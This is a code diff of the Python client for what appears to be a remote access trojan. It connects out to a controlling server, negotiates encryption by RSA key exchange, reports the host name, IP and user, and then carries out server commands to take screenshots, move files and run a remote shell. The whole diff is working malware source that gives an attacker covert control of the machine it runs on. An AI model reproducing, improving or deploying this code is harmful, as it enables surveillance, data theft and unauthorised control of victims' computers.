@@ -1,16 +1,15 @@
 import socket
-import sys
 import os
 import time
 import subprocess
-from cryptography.fernet import Fernet
 import mss
+import rsa
+from cryptography.fernet import Fernet
 
 
 
-address = ("0.0.0.0", 3001)
-f_key = b'FhnnERujmRY65fVqM0S_LvK26NybEETUlK0_gvV9Dws=' # Insert key from Fernet.generate_key(), must be same as Server
-
+address = ("0.0.0.0", 3000)
+authed = False
 
 def take_screen_shot():
     if mss.mss().monitors:
@@ -22,39 +21,29 @@ def take_screen_shot():
         send(b'')
 
 def get_info():
-    description = f"""Client Name: {os.uname().nodename}\nLocal IP: {socket.gethostbyname(os.uname().nodename)}\nUser: {os.getlogin()}\nPassword: {"🤷🏻‍♂️ (Dunno know)"}"""
+    description = f"""Client Name: {os.uname().nodename}\nLocal IP: {socket.gethostbyname(os.uname().nodename)}\nUser: {os.getlogin()}\nPassword: {"Dunno🤷🏻‍♂️"}"""
     send(description.encode())
 
-def recv(buff_size=1024, show_status=False):
+def recv(buff_size=1024):
     data_buff = bytes()
+    data_size = server_con.recv(12)
 
-    try:
-        data_size = server_con.recv(12)
+    if len(data_size) > 0:
         data_size = int(data_size.decode().rstrip())
+    else:
+        return None
 
-        if not data_size:
-            return None
-
-        while len(data_buff) < data_size:
-            if show_status:
-                print(f"{len(data_buff/8)}/{data_size/8}KB")
-
-            data_buff += server_con.recv(buff_size)
-
+    while len(data_buff) < data_size:
+        data_buff += server_con.recv(buff_size)
         
-
-    except:
-        print("Unable to retrieve data.")
-        
-    return lock.decrypt(data_buff)
+    return decrypt(data_buff) if authed else data_buff
 
 
-def send(data):
-    header_size = 12
-    encrypted_data = lock.encrypt(data)
-    data_size = f"{len(encrypted_data):<{header_size}}"
-    server_con.sendall(data_size.encode()+encrypted_data)
-
+def send(data, header_size=12):
+    if authed:
+        data = encrypt(data)
+    data_size = f"{len(data):<{header_size}}"
+    server_con.sendall(data_size.encode()+data)
 
 def upload_file(file_name):
     try:
@@ -67,7 +56,7 @@ def upload_file(file_name):
         send(b'')
 
 def download_file(file_name, file_path):
-    file_data = recv(buff_size=16384, show_status=True)
+    file_data = recv(buff_size=32768)
     if not file_data:
         print("Could not download file...")
         return
@@ -101,7 +90,7 @@ def open_shell():
             except FileNotFoundError as e:
                 str_msg = str(e).encode()
             else:
-                str_msg = os.getcwd().encode() + b"\n"
+                str_msg = os.getcwd().encode()
 
         elif cmd[:2] == "dw":
             file_name = cmd[3:]
@@ -124,28 +113,32 @@ def open_shell():
         send(str_msg)
 
 
+def encrypt(data):
+    return lck.encrypt(data)
+
+def decrypt(encrypted_data):
+    return lck.decrypt(encrypted_data)
 
 
 def establish_connection(address):
-    global server_con, lock
-    lock = Fernet(f_key)
+    global server_con, authed, lck
+    public_key, private_key = rsa.newkeys(512)
 
     print("Connecting...")
-    while True:
-        try:
-            server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_con.connect((address[0],address[1]))
-            print(f"Connected!\nServer: {address[0]}:{address[1]}")
+    while not authed:
+        server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_con.connect((address[0],address[1]))
+        print(f"Connected!\nServer: {address[0]}:{address[1]}")
 
-            send(f_key)
-            is_OK = recv().decode()
-            if is_OK == "OK":
-                break
+        public_key_buff = public_key.save_pkcs1('PEM')
+        send(public_key_buff)
 
-        except:
-            time.sleep(3)
-        else:
-            break
+        key = rsa.decrypt(recv(), private_key)
+        lck = Fernet(key)
+        if lck:
+            send(lck.encrypt(b'\n\nOK\n\n'))
+            authed = True
+        
 
 def kill_connection():
     server_con.shutdown(socket.SHUT_WR)
@@ -153,6 +146,8 @@ def kill_connection():
 
 def main():
     establish_connection(address)
+    get_info()
+
     while True:
         choice = recv().decode()
         if choice == "1":
@@ -162,11 +157,7 @@ def main():
             take_screen_shot()
         elif choice == "3":
             pass
-
         elif choice == "4":
-            get_info()
-
-        elif choice == "5":
             keep_alive = recv().decode().lower()
             if keep_alive == "y" or keep_alive == "yes":
                 server_con.shutdown(socket.SHUT_WR)
